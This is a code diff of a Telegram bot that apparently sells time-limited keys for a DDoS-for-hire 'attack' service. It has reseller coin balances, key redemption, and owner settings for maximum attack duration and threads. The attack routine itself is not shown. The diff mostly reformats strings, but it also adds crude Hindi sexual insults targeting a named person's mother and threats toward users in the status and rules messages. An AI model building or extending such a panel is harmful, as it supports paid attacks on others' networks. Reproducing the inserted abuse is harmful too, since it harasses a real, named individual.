+            active_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Expires in {hours}h {minutes}m)")
         else:
-            expired_keys.append("🔑 `{}` (Expired)".format(escape_markdown(key, version=2)))
+            expired_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Expired)")
 
     for key, key_info in special_keys.items():
         if key_info['expiration_time'] > current_time:
@@ -790,12 +757,7 @@ async def show_keys(update: Update, context: CallbackContext):
                 except Exception:
                     generated_by_username = "Unknown"
                     
-            active_special_keys.append("💎 `{}` (Generated by @{}, Expires in {}d {}h)".format(
-                escape_markdown(key, version=2),
-                generated_by_username,
-                days,
-                hours
-            ))
+            active_special_keys.append(f"💎 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Expires in {days}d {hours}h)")
 
     for key, key_info in redeemed_keys_info.items():
         if key_info['redeemed_by'] in redeemed_users:
@@ -813,132 +775,130 @@ async def show_keys(update: Update, context: CallbackContext):
                 pass
             
             if 'is_special' in key_info and key_info['is_special']:
-                redeemed_keys.append("💎 `{}` (Generated by @{}, Redeemed by @{})".format(
-                    escape_markdown(key, version=2),
-                    generated_by_username,
-                    redeemed_by_username
-                ))
+                redeemed_keys.append(f"💎 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Redeemed by @{redeemed_by_username})")
             else:
-                redeemed_keys.append("🔑 `{}` (Generated by @{}, Redeemed by @{})".format(
-                    escape_markdown(key, version=2),
-                    generated_by_username,
-                    redeemed_by_username
-                ))
+                redeemed_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Redeemed by @{redeemed_by_username})")
 
     message = (
-        "*🗝️ Active Regular Keys:*\n" +
-        ('\n'.join(active_keys) if active_keys else 'No active regular keys found.') +
-        "\n\n*💎 Active Special Keys:*\n" +
-        ('\n'.join(active_special_keys) if active_special_keys else 'No active special keys found.') +
-        "\n\n*🗝️ Redeemed Keys:*\n" +
-        ('\n'.join(redeemed_keys) if redeemed_keys else 'No redeemed keys found.') +
-        "\n\n*🗝️ Expired Keys:*\n" +
-        ('\n'.join(expired_keys) if expired_keys else 'No expired keys found.') +
-        "\n\n👑 Owner: @Riyahacksyt\n" +
-        "🔑 DM for keys: @Riyahacksyt"
+        "*🗝️ Active Regular Keys:*\n"
+        f"{'\n'.join(active_keys) if active_keys else 'No active regular keys found.'}\n\n"
+        "*💎 Active Special Keys:*\n"
+        f"{'\n'.join(active_special_keys) if active_special_keys else 'No active special keys found.'}\n\n"
+        "*🗝️ Redeemed Keys:*\n"
+        f"{'\n'.join(redeemed_keys) if redeemed_keys else 'No redeemed keys found.'}\n\n"
+        "*🗝️ Expired Keys:*\n"
+        f"{'\n'.join(expired_keys) if expired_keys else 'No expired keys found.'}\n\n"
+        "👑 *Owner:* @Riyahacksyt\n"
+        "🔑 *DM for keys:* @Riyahacksyt"
     )
 
     await update.message.reply_text(message, parse_mode='Markdown')
 
+# Set Duration Command - Start Conversation
 async def set_duration_start(update: Update, context: CallbackContext):
     if not is_owner(update):
         await update.message.reply_text(
-            "❌ Only the owner can set max attack duration!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Only the owner can set max attack duration!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the maximum attack duration in seconds.\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "⚠️ *Enter the maximum attack duration in seconds.*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_SET_DURATION
 
+# Set Duration Command - Handle Duration Input
 async def set_duration_input(update: Update, context: CallbackContext):
     global max_duration
     try:
         max_duration = int(update.message.text)
         await update.message.reply_text(
-            "✅ Maximum attack duration set to {} seconds!\n\n"
-            "👑 Owner: @Riyahacksyt".format(max_duration),
+            f"✅ *Maximum attack duration set to {max_duration} seconds!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
     except ValueError:
         await update.message.reply_text(
-            "❌ Invalid input! Please enter a number.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid input! Please enter a number.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
     return ConversationHandler.END
 
+# Set Threads Command - Start Conversation
 async def set_threads_start(update: Update, context: CallbackContext):
     if not is_owner(update):
         await update.message.reply_text(
-            "❌ Only the owner can set max threads!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Only the owner can set max threads!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the maximum number of threads.\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "⚠️ *Enter the maximum number of threads.*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_SET_THREADS
 
+# Set Threads Command - Handle Threads Input
 async def set_threads_input(update: Update, context: CallbackContext):
     global MAX_THREADS
     try:
         MAX_THREADS = int(update.message.text)
         await update.message.reply_text(
-            "✅ Maximum threads set to {}!\n\n"
-            "👑 Owner: @Riyahacksyt".format(MAX_THREADS),
+            f"✅ *Maximum threads set to {MAX_THREADS}!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
     except ValueError:
         await update.message.reply_text(
-            "❌ Invalid input! Please enter a number.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid input! Please enter a number.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
     return ConversationHandler.END
 
+# Delete Key Command - Start Conversation
 async def delete_key_start(update: Update, context: CallbackContext):
     if not is_owner(update):
         await update.message.reply_text(
-            "❌ Only the owner can delete keys!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Only the owner can delete keys!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the key to delete.\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "⚠️ *Enter the key to delete.*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_DELETE_KEY
 
+# Delete Key Command - Handle Key Input
 async def delete_key_input(update: Update, context: CallbackContext):
     key = update.message.text
 
     if key in keys:
         del keys[key]
         await update.message.reply_text(
-            "✅ Key `{}` deleted successfully!\n\n"
-            "👑 Owner: @Riyahacksyt".format(key),
+            f"✅ *Key `{key}` deleted successfully!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
     elif key in special_keys:
         del special_keys[key]
         await update.message.reply_text(
-            "✅ Special Key `{}` deleted successfully!\n\n"
-            "👑 Owner: @Riyahacksyt".format(key),
+            f"✅ *Special Key `{key}` deleted successfully!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
     elif key in redeemed_keys_info:
@@ -949,36 +909,38 @@ async def delete_key_input(update: Update, context: CallbackContext):
             del redeemed_users[user_id]
         del redeemed_keys_info[key]
         await update.message.reply_text(
-            "✅ Redeemed key `{}` deleted successfully!\n\n"
-            "👑 Owner: @Riyahacksyt".format(key),
+            f"✅ *Redeemed key `{key}` deleted successfully!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
     else:
         await update.message.reply_text(
-            "❌ Key not found!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Key not found!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
 
     save_keys()
     return ConversationHandler.END
 
+# Add Reseller Command - Start Conversation
 async def add_reseller_start(update: Update, context: CallbackContext):
     if not is_owner(update):
         await update.message.reply_text(
-            "❌ Only the owner can add resellers!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Only the owner can add resellers!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the user ID of the reseller.\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "⚠️ *Enter the user ID of the reseller.*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_RESELLER_ID
 
+# Add Reseller Command - Handle User ID Input
 async def add_reseller_input(update: Update, context: CallbackContext):
     user_id_str = update.message.text
 
@@ -987,36 +949,38 @@ async def add_reseller_input(update: Update, context: CallbackContext):
         resellers.add(user_id)
         reseller_balances[user_id] = 0
         await update.message.reply_text(
-            "✅ Reseller with ID {} added successfully!\n\n"
-            "👑 Owner: @Riyahacksyt".format(user_id),
+            f"✅ *Reseller with ID {user_id} added successfully!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
     except ValueError:
         await update.message.reply_text(
-            "❌ Invalid user ID! Please enter a valid numeric ID.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid user ID! Please enter a valid numeric ID.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     return ConversationHandler.END
 
+# Remove Reseller Command - Start Conversation
 async def remove_reseller_start(update: Update, context: CallbackContext):
     if not is_owner(update):
         await update.message.reply_text(
-            "❌ Only the owner can remove resellers!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Only the owner can remove resellers!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the user ID of the reseller to remove.\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "⚠️ *Enter the user ID of the reseller to remove.*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_REMOVE_RESELLER_ID
 
+# Remove Reseller Command - Handle User ID Input
 async def remove_reseller_input(update: Update, context: CallbackContext):
     user_id_str = update.message.text
 
@@ -1027,42 +991,44 @@ async def remove_reseller_input(update: Update, context: CallbackContext):
             if user_id in reseller_balances:
                 del reseller_balances[user_id]
             await update.message.reply_text(
-                "✅ Reseller with ID {} removed successfully!\n\n"
-                "👑 Owner: @Riyahacksyt".format(user_id),
+                f"✅ *Reseller with ID {user_id} removed successfully!*\n\n"
+                "👑 *Owner:* @Riyahacksyt",
                 parse_mode='Markdown'
             )
         else:
             await update.message.reply_text(
-                "❌ Reseller not found!\n\n"
-                "👑 Owner: @Riyahacksyt",
+                "❌ *Reseller not found!*\n\n"
+                "👑 *Owner:* @Riyahacksyt",
                 parse_mode='Markdown'
             )
     except ValueError:
         await update.message.reply_text(
-            "❌ Invalid user ID! Please enter a valid numeric ID.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid user ID! Please enter a valid numeric ID.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     return ConversationHandler.END
 
+# Add Coin Command - Start Conversation
 async def add_coin_start(update: Update, context: CallbackContext):
     if not is_owner(update):
         await update.message.reply_text(
-            "❌ Only the owner can add coins!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Only the owner can add coins!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the user ID of the reseller.\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "⚠️ *Enter the user ID of the reseller.*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_ADD_COIN_USER_ID
 
+# Add Coin Command - Handle User ID Input
 async def add_coin_user_id(update: Update, context: CallbackContext):
     user_id_str = update.message.text
 
@@ -1071,28 +1037,29 @@ async def add_coin_user_id(update: Update, context: CallbackContext):
         if user_id in resellers:
             context.user_data['add_coin_user_id'] = user_id
             await update.message.reply_text(
-                "⚠️ Enter the amount of coins to add.\n\n"
-                "👑 Owner: @Riyahacksyt",
+                "⚠️ *Enter the amount of coins to add.*\n\n"
+                "👑 *Owner:* @Riyahacksyt",
                 parse_mode='Markdown'
             )
             return GET_ADD_COIN_AMOUNT
         else:
             await update.message.reply_text(
-                "❌ Reseller not found!\n\n"
-                "👑 Owner: @Riyahacksyt",
+                "❌ *Reseller not found!*\n\n"
+                "👑 *Owner:* @Riyahacksyt",
                 parse_mode='Markdown'
             )
             return ConversationHandler.END
     except ValueError:
         await update.message.reply_text(
-            "❌ Invalid user ID! Please enter a valid numeric ID.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid user ID! Please enter a valid numeric ID.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     return ConversationHandler.END
 
+# Add Coin Command - Handle Amount Input
 async def add_coin_amount(update: Update, context: CallbackContext):
     amount_str = update.message.text
 
@@ -1102,31 +1069,32 @@ async def add_coin_amount(update: Update, context: CallbackContext):
         if user_id in reseller_balances:
             reseller_balances[user_id] += amount
             await update.message.reply_text(
-                "✅ Added {} coins to reseller {}. New balance: {}*\n\n"
-                "👑 Owner: @Riyahacksyt".format(amount, user_id, reseller_balances[user_id]),
+                f"✅ *Added {amount} coins to reseller {user_id}. New balance: {reseller_balances[user_id]}*\n\n"
+                "👑 *Owner:* @Riyahacksyt",
                 parse_mode='Markdown'
             )
         else:
             await update.message.reply_text(
-                "❌ Reseller not found!\n\n"
-                "👑 Owner: @Riyahacksyt",
+                "❌ *Reseller not found!*\n\n"
+                "👑 *Owner:* @Riyahacksyt",
                 parse_mode='Markdown'
             )
     except ValueError:
         await update.message.reply_text(
-            "❌ Invalid amount! Please enter a number.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid amount! Please enter a number.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     return ConversationHandler.END
 
+# Balance Command
 async def balance(update: Update, context: CallbackContext):
     if not is_reseller(update):
         await update.message.reply_text(
-            "❌ Only resellers can check their balance!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Only resellers can check their balance!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return
@@ -1134,27 +1102,29 @@ async def balance(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     balance = reseller_balances.get(user_id, 0)
     await update.message.reply_text(
-        "💰 Your current balance is: {} coins\n\n"
-        "👑 Owner: @Riyahacksyt\n"
-        "💳 DM to recharge balance: @Riyahacksyt".format(balance),
+        f"💰 *Your current balance is: {balance} coins*\n\n"
+        "👑 *Owner:* @Riyahacksyt\n"
+        "💳 *DM to recharge balance:* @Riyahacksyt",
         parse_mode='Markdown'
     )
 
+# Handle Photo Feedback
 async def handle_photo(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id in feedback_waiting:
         del feedback_waiting[user_id]
         await update.message.reply_text(
-            "✅ Thanks for your feedback!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "✅ *Thanks for your feedback!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
 
+# Check Key Status Command
 async def check_key_status(update: Update, context: CallbackContext):
     if not is_allowed_group(update):
         await update.message.reply_text(
-            "❌ This command can only be used in the allowed group!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *This command can only be used in the allowed group!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return
@@ -1179,39 +1149,29 @@ async def check_key_status(update: Update, context: CallbackContext):
                         break
                 
                 status_message = (
-                    "🔍 Special Key Status\n\n"
-                    "👤 User: {}\n"
-                    "🆔 ID: `{}`\n"
-                    "🔑 Key: `{}`\n"
-                    "⏳ Status: 🟢 Running\n"
-                    "🕒 Remaining Time: {}d {}h\n"
-                    "⚡ Max Duration: {} sec\n"
-                    "🧵 Max Threads: {}\n\n"
-                    "👑 Bot Owner: @Riyahacksyt\n\n"
-                    "💎 Enjoy your premium special access!".format(
-                        escape_markdown(user_name, version=2),
-                        user_id,
-                        escape_markdown(key_info, version=2) if key_info else 'Unknown',
-                        days,
-                        hours,
-                        SPECIAL_MAX_DURATION,
-                        SPECIAL_MAX_THREADS
-                    )
+                    f"🔍 *Special Key Status*\n\n"
+                    f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
+                    f"🆔 *ID:* `{user_id}`\n"
+                    f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
+                    f"⏳ *Status:* 🟢 Running\n"
+                    f"🕒 *Remaining Time:* {days}d {hours}h\n"
+                    f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
+                    f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
+                    f"👑 *Bot Owner:* @Riyahacksyt\n\n"
+                    f"💎 *Enjoy your premium special access!*"
+                    f"💎 *SPECIAL ACCESS SE APP RITIK KI MUMMY KI OR JADA CHUT PHAAD SKTE HA!*"
                 )
             else:
                 status_message = (
-                    "🔍 Special Key Status\n\n"
-                    "👤 User: {}\n"
-                    "🆔 ID: `{}`\n"
-                    "🔑 Key: `{}`\n"
-                    "⏳ Status: 🔴 Expired\n\n"
-                    "👑 Bot Owner: @Riyahacksyt\n"
-                    "🔑 DM for new special keys: @Riyahacksyt\n\n"
-                    "❌ Your special key has expired.".format(
-                        escape_markdown(user_name, version=2),
-                        user_id,
-                        escape_markdown(key_info, version=2) if key_info else 'Unknown'
-                    )
+                    f"🔍 *Special Key Status*\n\n"
+                    f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
+                    f"🆔 *ID:* `{user_id}`\n"
+                    f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
+                    f"⏳ *Status:* 🔴 Expired\n\n"
+                    f"👑 *Bot Owner:* @Riyahacksyt\n"
+                    f"🔑 *DM for new special keys:* @Riyahacksyt\n\n"
+                    f"❌ *Your special key has expired.*"
+                    f"❌ *APP RITIK KI MUMMNY KI CHUT NHI PHAAD SKTE.*"
                 )
         else:
             expiration_time = redeemed_users[user_id]
@@ -1228,75 +1188,66 @@ async def check_key_status(update: Update, context: CallbackContext):
                         break
                 
                 status_message = (
-                    "🔍 Key Status\n\n"
-                    "👤 User: {}\n"
-                    "🆔 ID: `{}`\n"
-                    "🔑 Key: `{}`\n"
-                    "⏳ Status: 🟢 Running\n"
-                    "🕒 Remaining Time: {}h {}m\n\n"
-                    "👑 Bot Owner: @Riyahacksyt\n\n"
-                    "⚡ Your key is active!".format(
-                        escape_markdown(user_name, version=2),
-                        user_id,
-                        escape_markdown(key_info, version=2) if key_info else 'Unknown',
-                        hours,
-                        minutes
-                    )
+                    f"🔍 *Key Status*\n\n"
+                    f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
+                    f"🆔 *ID:* `{user_id}`\n"
+                    f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
+                    f"⏳ *Status:* 🟢 Running\n"
+                    f"🕒 *Remaining Time:* {hours}h {minutes}m\n\n"
+                    f"👑 *Bot Owner:* @Riyahacksyt\n\n"
+                    f"⚡ *ABB APP RITIK KI MUMMY KI CHUT PHAAD SKTE HA!*"
                 )
             else:
                 status_message = (
-                    "🔍 Key Status\n\n"
-                    "👤 User: {}\n"
-                    "🆔 ID: `{}`\n"
-                    "🔑 Key: `{}`\n"
-                    "⏳ Status: 🔴 Expired\n\n"
-                    "👑 Bot Owner: @Riyahacksyt\n"
-                    "🔑 DM for new keys: @Riyahacksyt\n\n"
-                    "❌ Your key has expired.".format(
-                        escape_markdown(user_name, version=2),
-                        user_id,
-                        escape_markdown(key_info, version=2) if key_info else 'Unknown'
-                    )
+                    f"🔍 *Key Status*\n\n"
+                    f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
+                    f"🆔 *ID:* `{user_id}`\n"
+                    f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
+                    f"⏳ *Status:* 🔴 Expired\n\n"
+                    f"👑 *Bot Owner:* @Riyahacksyt\n"
+                    f"🔑 *DM for new keys:* @Riyahacksyt\n\n"
+                    f"❌ *Your key has expired. ABB APP CHUT NHI PHAAD SKTE.*"
                 )
     else:
         status_message = (
-            "🔍 Key Status\n\n"
-            "👤 User: {}\n"
-            "🆔 ID: `{}`\n\n"
-            "❌ No active key found!\n\n"
-            "👑 Bot Owner: @Riyahacksyt\n"
-            "🔑 DM to purchase keys: @Riyahacksyt\n\n"
-            "ℹ️ You need a key to use the bot.".format(
-                escape_markdown(user_name, version=2),
-                user_id
-            )
+            f"🔍 *Key Status*\n\n"
+            f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
+            f"🆔 *ID:* `{user_id}`\n\n"
+            f"❌ *No active key found!*\n\n"
+            f"👑 *Bot Owner:* @Riyahacksyt\n"
+            f"🔑 *DM to purchase keys:* @Riyahacksyt\n\n"
+            f"ℹ️ *Use the Redeem Key button to activate your access.*"
         )
 
     await update.message.reply_text(status_message, parse_mode='Markdown')
 
+# Cancel Current Conversation
 async def cancel_conversation(update: Update, context: CallbackContext):
     await update.message.reply_text(
-        "❌ Current process canceled.\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "❌ *Current process canceled.*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return ConversationHandler.END
 
+# Rules Command
 async def rules(update: Update, context: CallbackContext):
     rules_text = (
-        "📜 Rules:\n\n"
+        "📜 *Rules:*\n\n"
         "1. Do not spam the bot\n"
         "2. Only use in allowed group\n"
         "3. Do not share your keys\n"
         "4. Follow instructions carefully\n"
         "5. Respect other users\n"
         "6. Violations = ban with no refund\n\n"
-        "👑 Bot Owner: @Riyahacksyt\n"
-        "🔑 DM for keys: @Riyahacksyt\n\n"
-        "Please follow the rules to avoid being banned."
+        "👑 *Bot Owner:* @Riyahacksyt\n"
+        "🔑 *DM for keys:* @Riyahacksyt\n\n"
+        "BSDK RULES FOLLOW KRNA WARNA GND MAR DUNGA.\n\n"
+        "JO BHI RITIK KI MUMMY KI CHUT PHHAD KE FEEDBACK DEGA USSE EXTRA KEY.\n"
     )
     await update.message.reply_text(rules_text, parse_mode='Markdown')
 
+# Handle Button Clicks
 async def handle_button_click(update: Update, context: CallbackContext):
     chat = update.effective_chat
     query = update.message.text
@@ -1306,9 +1257,9 @@ async def handle_button_click(update: Update, context: CallbackContext):
         await update.message.reply_photo(
             photo=image['url'],
             caption=(
-                "❌ This bot is not authorized to use here.\n\n"
-                "👑 Owner: @Riyahacksyt\n"
-                "🔑 DM for keys: @Riyahacksyt"
+                "❌ *This bot is not authorized to use here.*\n\n"
+                "👑 *Owner:* @Riyahacksyt\n"
+                "🔑 *DM for keys:* @Riyahacksyt"
             ),
             parse_mode='Markdown'
         )
@@ -1353,18 +1304,19 @@ async def handle_button_click(update: Update, context: CallbackContext):
     elif query == 'RE MENU':
         if is_owner(update):
             await update.message.reply_text(
-                "🔧 Owner Management Menu",
+                "🔧 *Owner Management Menu*",
                 parse_mode='Markdown',
                 reply_markup=re_menu_markup
             )
     elif query == 'Back to Main':
         if is_owner(update):
             await update.message.reply_text(
-                "👑 Owner Menu",
+                "👑 *Owner Menu*",
                 parse_mode='Markdown',
                 reply_markup=owner_markup
             )
 
+# Periodic Task to Check for Expired Keys
 async def check_expired_keys(context: CallbackContext):
     current_time = time.time()
     expired_users = []
@@ -1384,8 +1336,9 @@ async def check_expired_keys(context: CallbackContext):
             del redeemed_keys_info[key]
 
     save_keys()
-    logging.info("Expired users and keys removed: {}".format(expired_users))
+    logging.info(f"Expired users and keys removed: {expired_users}")
 
+# Main Bot Setup
 def main():
     load_keys()
 
@@ -1393,8 +1346,9 @@ def main():
 
     application.job_queue.run_repeating(check_expired_keys, interval=60, first=0)
 
+    # Add conversation handlers
     generate_key_handler = ConversationHandler(
-        entry_points=[CommandHandler("generatekey", generate_key_start), MessageHandler(filters.TEXT & filters.Regex('^Generate Key$'), generate_key_start)],
+        entry_points=[CommandHandler("generatekey", generate_key_start), MessageHandler(filters.Text("Generate Key"), generate_key_start)],
         states={
             GET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_key_duration)],
         },
@@ -1402,7 +1356,7 @@ def main():
     )
 
     redeem_key_handler = ConversationHandler(
-        entry_points=[CommandHandler("redeemkey", redeem_key_start), MessageHandler(filters.TEXT & filters.Regex('^Redeem Key$'), redeem_key_start)],
+        entry_points=[CommandHandler("redeemkey", redeem_key_start), MessageHandler(filters.Text("Redeem Key"), redeem_key_start)],
         states={
             GET_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key_input)],
         },
@@ -1410,7 +1364,7 @@ def main():
     )
 
     attack_handler = ConversationHandler(
-        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.TEXT & filters.Regex('^Attack$'), attack_start)],
+        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.Text("Attack"), attack_start)],
         states={
             GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
         },
@@ -1418,7 +1372,7 @@ def main():
     )
 
     set_duration_handler = ConversationHandler(
-        entry_points=[CommandHandler("setduration", set_duration_start), MessageHandler(filters.TEXT & filters.Regex('^Set Duration$'), set_duration_start)],
+        entry_points=[CommandHandler("setduration", set_duration_start), MessageHandler(filters.Text("Set Duration"), set_duration_start)],
         states={
             GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration_input)],
         },
@@ -1426,7 +1380,7 @@ def main():
     )
 
     set_threads_handler = ConversationHandler(
-        entry_points=[CommandHandler("setthreads", set_threads_start), MessageHandler(filters.TEXT & filters.Regex('^Set Threads$'), set_threads_start)],
+        entry_points=[CommandHandler("set_threads", set_threads_start), MessageHandler(filters.Text("Set Threads"), set_threads_start)],
         states={
             GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads_input)],
         },
@@ -1434,7 +1388,7 @@ def main():
     )
 
     delete_key_handler = ConversationHandler(
-        entry_points=[CommandHandler("deletekey", delete_key_start), MessageHandler(filters.TEXT & filters.Regex('^Delete Key$'), delete_key_start)],
+        entry_points=[CommandHandler("deletekey", delete_key_start), MessageHandler(filters.Text("Delete Key"), delete_key_start)],
         states={
             GET_DELETE_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete_key_input)],
         },
@@ -1442,7 +1396,7 @@ def main():
     )
 
     add_reseller_handler = ConversationHandler(
-        entry_points=[CommandHandler("addreseller", add_reseller_start), MessageHandler(filters.TEXT & filters.Regex('^Add Reseller$'), add_reseller_start)],
+        entry_points=[CommandHandler("addreseller", add_reseller_start), MessageHandler(filters.Text("Add Reseller"), add_reseller_start)],
         states={
             GET_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_reseller_input)],
         },
@@ -1450,7 +1404,7 @@ def main():
     )
 
     remove_reseller_handler = ConversationHandler(
-        entry_points=[CommandHandler("removereseller", remove_reseller_start), MessageHandler(filters.TEXT & filters.Regex('^Remove Reseller$'), remove_reseller_start)],
+        entry_points=[CommandHandler("removereseller", remove_reseller_start), MessageHandler(filters.Text("Remove Reseller"), remove_reseller_start)],
         states={
             GET_REMOVE_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_reseller_input)],
         },
@@ -1458,7 +1412,7 @@ def main():
     )
 
     add_coin_handler = ConversationHandler(
-        entry_points=[CommandHandler("addcoin", add_coin_start), MessageHandler(filters.TEXT & filters.Regex('^Add Coin$'), add_coin_start)],
+        entry_points=[CommandHandler("addcoin", add_coin_start), MessageHandler(filters.Text("Add Coin"), add_coin_start)],
         states={
             GET_ADD_COIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_user_id)],
             GET_ADD_COIN_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_amount)],
@@ -1467,7 +1421,7 @@ def main():
     )
 
     set_cooldown_handler = ConversationHandler(
-        entry_points=[CommandHandler("setcooldown", set_cooldown_start), MessageHandler(filters.TEXT & filters.Regex('^Set Cooldown$'), set_cooldown_start)],
+        entry_points=[CommandHandler("setcooldown", set_cooldown_start), MessageHandler(filters.Text("Set Cooldown"), set_cooldown_start)],
         states={
             GET_SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown_input)],
         },
@@ -1475,7 +1429,7 @@ def main():
     )
 
     special_key_handler = ConversationHandler(
-        entry_points=[MessageHandler(filters.TEXT & filters.Regex('^🔑 Special Key$'), generate_special_key_start)],
+        entry_points=[MessageHandler(filters.Text("🔑 Special Key"), generate_special_key_start)],
         states={
             GET_SPECIAL_KEY_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_duration)],
             GET_SPECIAL_KEY_FORMAT: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_format)],
@@ -1483,6 +1437,7 @@ def main():
         fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
 
+    # Add all handlers
     application.add_handler(generate_key_handler)
     application.add_handler(redeem_key_handler)
     application.add_handler(attack_handler)
